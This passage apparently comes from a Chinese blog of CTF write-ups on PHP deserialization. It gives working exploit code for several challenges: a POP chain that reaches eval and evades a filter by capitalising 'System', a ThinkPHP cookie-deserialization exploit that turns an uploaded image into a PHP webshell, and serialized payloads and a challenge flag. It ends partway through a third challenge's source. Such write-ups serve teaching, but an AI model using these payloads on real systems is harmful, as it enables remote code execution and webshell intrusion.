class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;waf.php&quot;</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NISA</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>=<span class="hljs-string">&quot;show_me_flag&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$txw4ever</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;fun==<span class="hljs-string">&quot;show_me_flag&quot;</span>)&#123;<br>            <span class="hljs-title function_ invoke__">hint</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$from</span>,<span class="hljs-variable">$val</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;fun=<span class="hljs-variable">$val</span>[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;fun;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">checkcheck</span>(<span class="hljs-variable">$this</span>-&gt;txw4ever);<br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;txw4ever);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TianXiWei</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ext-&gt;<span class="hljs-title function_ invoke__">nisa</span>(<span class="hljs-variable">$this</span>-&gt;x);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ilovetxw</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$huang</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$su</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun1</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;huang-&gt;fun=<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;su;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$bb</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">four</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;TXW4EVER&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$fun</span>=<span class="hljs-string">&#x27;abc&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span>=<span class="hljs-variable">$value</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;fun = <span class="hljs-string">&quot;sixsixsix&quot;</span>)&#123;<br>            <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$this</span>-&gt;a);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ser&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ser&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-comment">//func checkcheck($data)&#123;</span><br><span class="hljs-comment">//  if(preg_match(......))&#123;</span><br><span class="hljs-comment">//      die(something wrong);</span><br><span class="hljs-comment">//  &#125;</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-comment">//function hint()&#123;</span><br><span class="hljs-comment">//    echo &quot;.......&quot;;</span><br><span class="hljs-comment">//    die();</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先代码审计，看到NISA类有一个提示函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>&#123;<br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;fun==<span class="hljs-string">&quot;show_me_flag&quot;</span>)&#123;<br>           <span class="hljs-title function_ invoke__">hint</span>();<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>先弄出来看一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NISA</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>=<span class="hljs-string">&quot;show_me_flag&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$txw4ever</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)  #反序列化，可以得到提示</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;fun==<span class="hljs-string">&quot;show_me_flag&quot;</span>)&#123;<br>            <span class="hljs-title function_ invoke__">hint</span>();<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$n</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">NISA</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$n</span>));<br>    <br><span class="hljs-comment">//O%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3Bs%3A12%3A%22show_me_flag%22%3Bs%3A8%3A%22txw4ever%22%3BN%3B%7D</span><br></code></pre></td></tr></table></figure><p>得到hint:<code>flag is in /</code></p><p>接着构造pop链：</p><p><code>NISA</code>的<code>__invoke()</code>方法有<code> @eval($this-&gt;txw4ever);</code>这里可以进行rce，所以<code>txw4ever</code>可以赋值&quot;system(‘ls /’)&quot;</p><p>要想调用到<code>__invoke()</code>,需要将对象当成函数使用，可以发现<code>Ilovetxw</code>的<code>__toString()</code>里面有<code>$bb()</code>,所以要让<code>$bb=new NISA();</code>，即<code>this-&gt;su=new NISA();</code></p><p>要想调用<code>__toString()</code>需要将对象当成字符串使用，可以发现<code>four</code>的<code>__set()</code>里面有<code>strtolower($this-&gt;a)</code>,所以要让<code>$this-&gt;a=new Ilovetxw();</code></p><p>要想调用<code>__set()</code>需要访问到对象的私有属性，可以发现<code>Ilovetxw</code>的<code>__call()</code>里面有<code>$this-&gt;huang-&gt;fun=$arg[0]</code>,<code>fun</code>刚好是<code>four</code>的私有属性，所以要让<code>this-&gt;huang=new four();</code></p><p>要想调用<code>__call()</code>需要在对象中调用不存在的方法，可以发现<code>TianXiWei</code>的<code>__wakeup()</code>里面有<code>$this-&gt;ext-&gt;nisa($this-&gt;x);</code>，<code>nisa</code>是<code>Ilovetxw</code>中没有的方法，所以要让<code>this-&gt;ext=new Ilovetxw();</code></p><p>最后反序列化时自动会调用到<code>TianXiWei</code>的<code>__wakeup()</code></p><p>而且为了让<code>NISA</code>的<code>__wakeup()</code>不被调用，<code>NISA</code>的<code>fun</code>不能为<code>show_me_flag</code></p><p>测试后发现<code>system</code>被过滤了，可以用大写绕过<code>System</code></p><p>最终poc如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NISA</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$txw4ever</span>=<span class="hljs-string">&quot;System(&#x27;ls /&#x27;);&quot;</span>;<span class="hljs-comment">//System(&#x27;cat /fllllllaaag&#x27;)</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TianXiWei</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ilovetxw</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$huang</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$su</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">four</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;TXW4EVER&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$fun</span>=<span class="hljs-string">&#x27;abc&#x27;</span>;<br>&#125;<br><span class="hljs-comment">// $n=new NISA();</span><br><span class="hljs-comment">// echo urlencode(serialize($n));</span><br><span class="hljs-variable">$t</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TianXiWei</span>();<br><span class="hljs-variable">$t</span>-&gt;ext=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Ilovetxw</span>();<br><span class="hljs-variable">$t</span>-&gt;ext-&gt;huang=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">four</span>();<br><span class="hljs-variable">$t</span>-&gt;ext-&gt;huang-&gt;a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Ilovetxw</span>();<br><span class="hljs-variable">$t</span>-&gt;ext-&gt;huang-&gt;a-&gt;su=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">NiSA</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$t</span>));<br><br><span class="hljs-comment">#NSSCTF&#123;8c286f51-8bd2-4c57-bdd8-a0da94e8975d&#125;</span><br></code></pre></td></tr></table></figure><h3 id="强网杯-2019upload"><a class="markdownIt-Anchor" href="#强网杯-2019upload"></a> [强网杯 2019]Upload</h3><p>大致浏览一下网页，发现有注册，登录，文件上传，查看文件几个页面，再随便看看有什么可以信息收集</p><p>发现注册之后有一个cookie</p><img src="/2023/02/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.jpg" class=""><p>base64解码后得到</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ID&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">11</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;q&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;q@qq.com&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">32</span>:<span class="hljs-string">&quot;7694f4a66316e53c8cdd9d9954bd611d&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>可以看到是一个序列化的字符串，记录了<code>username,email,password</code>,而且password似乎是md5</p><p>上传文件后cookie变成了</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ID&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">11</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;q&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;q@qq.com&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">32</span>:<span class="hljs-string">&quot;7694f4a66316e53c8cdd9d9954bd611d&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">79</span>:<span class="hljs-string">&quot;../upload/f9e1016a5cec370aae6a18d438dabfa5/a7c3ce076585477741d951d179ab07dc.png&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>尝试传图片马没什么用，然后就没什么思路了</p><p>用dirsearch扫一扫，果然有发现，扫到了源码<code>www.tar.gz</code></p><p>解压发现是thinkphp5的框架</p><p>然后就是代码审计，按照页面操作的流程来</p><p>先是<code>register</code>,在<code>application/web/controller/Register.php</code>可以看到源码</p><p>大致逻辑是：检查是否登录，判断是否输入用户名，合理邮箱，密码，没有的话回到index页面</p><p>然后<code>login</code>,大致逻辑是：确定是否登录，这里是通过cookie来检查的。</p><p>文件上传大致逻辑：做一下后缀限制以及修改成文件名并只存储png</p><p>总结一下：有文件上传，一般是上传图片马来攻击，但是这里传上去的只能是图片，解析不了，比以往不同的是这里多了cookie,而且cookie会进行反序列化，重要的是cookie是我们能修改的，所以思路应该是利用反序列化来修改文件存储的名称</p><p>这里主要是以为这些类不能相互利用会被卡住，其实直接看普通类反序列化漏洞就行，而且平时反序列化的题目最终是进行rce,而这里是为了调用<code>upload_img</code>,来修改文件保存的名称</p><p>所以先传一个图片马写入webshell，然后修改cookie，再蚁剑连接</p><p>直接上exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">web</span>\<span class="hljs-title class_">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">migration</span>\<span class="hljs-title">command</span>\<span class="hljs-title">migrate</span>\<span class="hljs-title">Run</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename_tmp</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$upload_menu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$img</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$except</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;except[<span class="hljs-variable">$name</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;&#125;(<span class="hljs-variable">$arguments</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_img</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Register</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$registed</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable language_">$this</span>-&gt;registed)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;checker-&gt;<span class="hljs-title function_ invoke__">index</span>();<br>        &#125;<br>    &#125;<br><br><br>&#125;<br><br><span class="hljs-variable">$profile</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Profile</span>();<br><span class="hljs-variable">$register</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Register</span>();<br><span class="hljs-variable">$register</span>-&gt;checker=<span class="hljs-variable">$profile</span>;<br><span class="hljs-variable">$register</span>-&gt;registed=<span class="hljs-literal">false</span>;<br><span class="hljs-variable">$profile</span>-&gt;filename_tmp=<span class="hljs-string">&#x27;./upload/f9e1016a5cec370aae6a18d438dabfa5/e59db807b2efbb8cadad694d9d1e8c91.png&#x27;</span>;<br><span class="hljs-variable">$profile</span>-&gt;filename=<span class="hljs-string">&#x27;./upload/1.php&#x27;</span>;<br><span class="hljs-variable">$profile</span>-&gt;ext=<span class="hljs-string">&#x27;png&#x27;</span>;<br><span class="hljs-variable">$profile</span>-&gt;img=<span class="hljs-string">&#x27;upload_img&#x27;</span>;<br><span class="hljs-variable">$profile</span>-&gt;except=[<span class="hljs-string">&quot;index&quot;</span>=&gt;<span class="hljs-string">&#x27;img&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$register</span>)));<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Tzoy<span class="hljs-symbol">NzoiYXBwXHdlYlxjb250</span>c<span class="hljs-name">m9</span>sbGVyXFJlZ<span class="hljs-number">2</span>lzdGVyIjoyO<span class="hljs-symbol">ntzOjc6</span>Im<span class="hljs-symbol">NoZWNrZXIiO086</span>MjY<span class="hljs-number">6</span>ImFwcFx<span class="hljs-number">3</span>ZWJcY<span class="hljs-number">29</span>udHJvbGxlclxQc<span class="hljs-name">m9</span>maWxlIj<span class="hljs-meta">o3</span>O<span class="hljs-symbol">ntzOjc6</span>Im<span class="hljs-symbol">NoZWNrZXIiO047</span>czoxMjoiZmlsZW<span class="hljs-number">5</span>hbWVfd<span class="hljs-name">G1</span>wIjtzOjc<span class="hljs-number">4</span>OiIuL<span class="hljs-number">3</span>Vwb<span class="hljs-name">G9</span>hZC<span class="hljs-number">9</span>mOWUxMDE<span class="hljs-number">2</span>YTVjZWMz<span class="hljs-symbol">NzBhYWU2</span>YTE<span class="hljs-number">4</span>ZDQzOGRhYmZh<span class="hljs-symbol">NS9</span>l<span class="hljs-symbol">NTlkYjgwN2</span>IyZWZiYjhjYWRhZDY<span class="hljs-number">5</span><span class="hljs-symbol">NGQ5</span>ZDFlOG<span class="hljs-name">M5</span>MS<span class="hljs-number">5</span>wbmci<span class="hljs-meta">O3</span><span class="hljs-name">M6</span>ODoiZmlsZW<span class="hljs-number">5</span>hbWUi<span class="hljs-meta">O3</span><span class="hljs-name">M6</span>MTQ<span class="hljs-number">6</span>Ii<span class="hljs-number">4</span>vdXBsb<span class="hljs-number">2</span>FkLzEucGhwIjtzOjExOiJ<span class="hljs-number">1</span>cGxvYWRfbWVudSI<span class="hljs-number">7</span>TjtzOj<span class="hljs-name">M6</span>ImV<span class="hljs-number">4</span>dCI<span class="hljs-number">7</span>czozOiJwbmci<span class="hljs-meta">O3</span><span class="hljs-name">M6</span>MzoiaW<span class="hljs-number">1</span><span class="hljs-symbol">nIjtzOjEwOiJ1</span>cGxvYWRfaW<span class="hljs-number">1</span><span class="hljs-symbol">nIjtzOjY6</span>ImV<span class="hljs-number">4</span>Y<span class="hljs-number">2</span>VwdCI<span class="hljs-number">7</span>YToxO<span class="hljs-symbol">ntzOjU6</span>ImluZGV<span class="hljs-number">4</span>IjtzOj<span class="hljs-name">M6</span>ImltZyI<span class="hljs-number">7</span>fX<span class="hljs-number">1</span>zOj<span class="hljs-name">g6</span>I<span class="hljs-symbol">nJlZ2</span>lzdGVkIjtiOjA<span class="hljs-number">7</span>fQ<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>得到cookie值，修改cookie进行访问，然后就可以蚁剑连接<code>/upload/1.php</code></p><h3 id="2021xp0int新生赛easy-unserialize"><a class="markdownIt-Anchor" href="#2021xp0int新生赛easy-unserialize"></a> 2021Xp0int新生赛easy-unserialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">getflag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file === <span class="hljs-string">&quot;flag.php&quot;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tmp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$str1</span>, <span class="hljs-variable">$str2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str1 = <span class="hljs-variable">$str1</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;str2 = <span class="hljs-variable">$str2</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$str1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str1&#x27;</span>];<br><span class="hljs-variable">$str2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str2&#x27;</span>];<br><span class="hljs-variable">$data</span> = <span 